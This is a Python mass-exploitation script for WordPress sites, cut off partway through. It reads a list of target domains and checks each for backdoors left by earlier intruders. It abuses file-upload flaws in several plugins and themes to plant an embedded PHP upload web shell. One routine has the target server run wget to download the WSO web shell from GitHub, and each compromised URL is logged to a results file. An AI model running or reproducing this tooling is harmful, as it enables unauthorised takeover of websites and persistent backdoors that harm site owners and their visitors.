try: import os
except : os.system("Invalid Python installition!\nPlease reinstall Python 3.")
try:import random
except : os.system("Invalid Python installition!\nPlease reinstall Python 3.")
try:import re
except : os.system("Invalid Python installition!\nPlease reinstall Python 3.")
try: import sys
except : os.system("Invalid Python installition!\nPlease reinstall Python 3.")
try: from colorama import Fore,init
except : os.system("pip3 install colorama")
try: import requests
except : os.system("pip3 install requests")
try: from multiprocessing.dummy import Pool
except : os.system("pip3 install multiprocessing")
try: from ctypes import *
except : os.system("pip3 install ctypes")
try: import datetime
except : os.system("pip3 install datetime")
init()
x = datetime.datetime.now()
shell = """
<?php 
if ($_GET['Titanium'] == 'Ex'){
    echo '<pre><p>Github : MataKucingOFC</p>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
}
?>
"""
filename = "TitaniumEx.php"
shell_data = '<?php echo \'Github : MataKucingOFC\';echo $file = fopen($_SERVER[\'DOCUMENT_ROOT\'].\'/{}\',\'w\'); $content = \'{}\'; fwrite($file,$content)?>'.format(filename,shell)
headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           'referer': 'www.google.com'}
requests.urllib3.disable_warnings()

banner = """
                  {} _____ _____ _____ ___   _   _ _____ _   ____  ___    _______   ___   _  __  
                  {}|_   _|_   _|_   _/ _ \ | \ | |_   _| | | |  \/  |   |  ___\ \ / / | | |/  | 
                  {}  | |   | |   | |/ /_\ \|  \| | | | | | | | .  . |   | |__  \ V /| | | |`| | 
                  {}  | |   | |   | ||  _  || . ` | | | | | | | |\/| |   |  __| /   \| | | | | | 
                  {}  | |  _| |_  | || | | || |\  |_| |_| |_| | |  | |   | |___/ /^\ \ \_/ /_| |_
                  {}  \_/  \___/  \_/\_| |_/\_| \_/\___/ \___/\_|  |_/   \____/\/   \/\___/ \___/
                                                {}NemesisTools {}: MataKucingOFC\n""".format(Fore.BLUE,Fore.YELLOW,Fore.BLUE,Fore.YELLOW,Fore.BLUE,Fore.YELLOW,Fore.LIGHTYELLOW_EX,Fore.LIGHTWHITE_EX)
    
if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")
if os.name== "nt": 
    os.system("title TitaniumEx - Github : MataKucingOFC")
else:
    sys.stdout.write("TitaniumEx - Github : MataKucingOFC")
print(banner)
try:
    target = [i.strip() for i in open(input(Fore.LIGHTYELLOW_EX+"["+Fore.BLUE+"+"+Fore.LIGHTYELLOW_EX+"]"+" List "+Fore.LIGHTCYAN_EX+"=> "+Fore.LIGHTWHITE_EX), mode='r').readlines()]
except KeyboardInterrupt:exit()
except FileNotFoundError : print(f"[{Fore.RED}!{Fore.WHITE}] File Not Found ")

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site:
        site = 'http://' + site
    if site[-1] != '/':
        site = site + '/'
    return site
def X(url):
    try :
        urlx = url +"/wp-content/themes/seotheme/mar.php"
        xe = requests.get(urlx,headers=headers,verify=False,timeout=5)
        if '#0x2525' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(urlx+"\n")
        else:
            urlx = url +"/wp-content/themes/seotheme/db.php?u"
            xe = requests.get(urlx,headers=headers,verify=False,timeout=5)
            if '#0x2525' in xe.text:
                print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
                open("Results/Shells.txt","a").write(urlx+"\n")
            else:
                print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X2(url):
    try:
        urlx = url +"/wp-content/themes/pridmag/db.php?u"
        xe = requests.get(urlx,headers=headers,verify=False,timeout=5)
        if '#0x2525' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(urlx+"\n")
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X3(url):
    try:
        urlx = url +"/wp-content/plugins/seoplugins/db.php?u"
        xe = requests.get(urlx,headers=headers,verify=False,timeout=5)
        if '#0x2525' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(urlx+"\n")
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X4(url):
    try:
        urlx = url +"/wp-content/plugins/seoplugins/mar.php"
        xe = requests.get(urlx,headers=headers,verify=False,timeout=5)
        if '#0x2525' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(urlx+"\n")
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X5(url):
    try:
        urlx = url +"/wp-content/plugins/linkpreview/db.php?u"
        xe = requests.get(urlx,headers=headers,verify=False,timeout=5)
        if '#0x2525' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(urlx+"\n")
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X6(url):
    try:
        urlx = url +"/wp-content/plugins/ioptimization/IOptimize.php?rchk"
        xe = requests.get(urlx,headers=headers,verify=False,timeout=5)
        if 'input type"submit" value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(urlx+"\n")
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X7(url):
    try:
        urlx = url +"/wp-content/uploads/up.php"
        xe = requests.get(urlx,headers=headers,verify=False,timeout=5)
        if 'input name="_upl" type="submit" id="_upl" value="Upload' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(urlx+"\n")
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X8(url):
    try:
        urlx = url +"/wp-content/updates.php"
        xe = requests.get(urlx,headers=headers,verify=False,timeout=5)
        if 'input type="submit" name="submit" value="  >>"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(urlx+"\n")
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X9(url):
    try:
        urlx = url +"/wp-content/plugins/ioptimization/IOptimize.php?rchk"
        xe = requests.get(urlx,headers=headers,verify=False,timeout=5)
        if 'input type"submit" value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(urlx+"\n")
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X10(url):
    try:
        filedata = {'filename': ('TitaniumEx.php', shell, 'text/html')}
        urlx = url +"/wp-content/plugins/apikey/apikey.php"
        upload_dir = url +"/wp-content/plugins/apikey/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,files=filedata,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X11(url):
    try:
        data = open('files/TitaniumEx.php', 'rb')
        urlx = url +"/wp-content/plugins/dzs-zoomsounds/savepng.php?location=TitaniumEx.php"
        upload_dir = url +"/wp-content/plugins/dzs-zoomsounds/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X12(url):
    try:
        data = {'1': 'TitaniumEx.php'}
        files = {'userfile': open('files/TitaniumEx.php', 'rb')}
        urlx = url +"/wp-content/plugins/ioptimizations/IOptimizes.php?hamlorszd"
        upload_dir = url +"/wp-content/plugins/ioptimizations/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,files=files,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X13(url):
    try:
        data = {'1': 'TitaniumEx.php'}
        files = {'userfile': open('files/TitaniumEx.php', 'rb')}
        urlx = url +"/wp-content/plugins/ioptimization/IOptimize.php?rchk"
        upload_dir = url +"/wp-content/plugins/ioptimization/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,files=files,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X14(url):
    try:
        files = {'file': open('files/TitaniumEx.php', 'rb')}
        data = {'filename': 'TitaniumEx.php'}
        urlx = url +"/wp-content/plugins/wp-engine-module/wp-engine.php"
        upload_dir = url +"/wp-content/plugins/wp-engine-module/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,files=files,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X15(url):
    try:
        files = {'fonticonzipfile': open('files/TitaniumEx.zip', 'rb')}
        data = {'action': 'uploadFontIcon', 'fontsetname': 'TitaniumEx', 'fonticonzipfile': 'uploadFontIcon'}
        urlx = url +"/wp-admin/admin-ajax.php?action=uploadFontIcon"
        upload_dir = url +"/wp-content/uploads/kaswara/fonts_icon/TitaniumEx/.TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,files=files,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X16(url):
    try:
        files = {'file': open('files/TitaniumEx.php', 'rb')}
        urlx = url +"/wp-content/plugins/cherry-plugin/admin/import-export/upload.php"
        upload_dir = url +"/wp-content/plugins/cherry-plugin/admin/import-export/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,files=files,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X17(url):
    try:
        filesxxx = {'files[]': open('files/TitaniumEx.php', 'rb')}
        urlx = url +"/wp-content/plugins/formcraft/file-upload/server/php/"
        upload_dir = url +"/wp-content/plugins/formcraft/file-upload/server/php/files/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,files=filesxxx,headers=headers,verify=False,timeout=20)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=15)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X18(url):
    try:
        data = {'action': 'add_custom_font'}
        files = {'file': open('files/TitaniumEx.zip', 'rb')}
        urlx = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +"/wp-content/uploads/typehub/custom/TitaniumEx/.TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,files=files,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X19(url):
    try:
        files = {'myfile[]': ('TitaniumEx.php4', shell, 'text/plain')}
        data = {'action':'gallery_from_files_595_fileupload', 'filesName':'myfile', 'allowExt':'php4', 'uploadDir':'/var/www/'}
        urlx = url +"/wp-admin/admin-ajax.php"
        upload_dir = url +"/TitaniumEx.php4?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,files=files,data=data,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X20(url):
    try:
        data = {"2": "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php -O TitaniumEx.php"}  
        payload = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx'
        upload_dir = url +"/wp-content/plugins/wpcargo/includes/barcode.php?text="+payload+"&sizefactor=.090909090909&size=1&filepath=../../../x.php"
        bidaha_post = url+"/wp-content/x.php?1=system"
        shellx = url+"/wp-content/TitaniumEx.php?Titanium=Ex"
        xe2 = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        xex = requests.post(bidaha_post,headers=headers,data=data,verify=False,timeout=5)
        xe = requests.get(shellx,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(shellx+"\n")
            (shellx)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X21(url):
    try:
        files = {'filename': open('files/TitaniumEx.php', 'rb')}
        urlx = url +"/wp-content/plugins/gatewayapi/inc/css_js.php"
        upload_dir = url +"/wp-content/plugins/gatewayapi/inc/TitaniumEx.php?Titanium=Ex"
        xex = requests.post(urlx,headers=headers,files=files,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
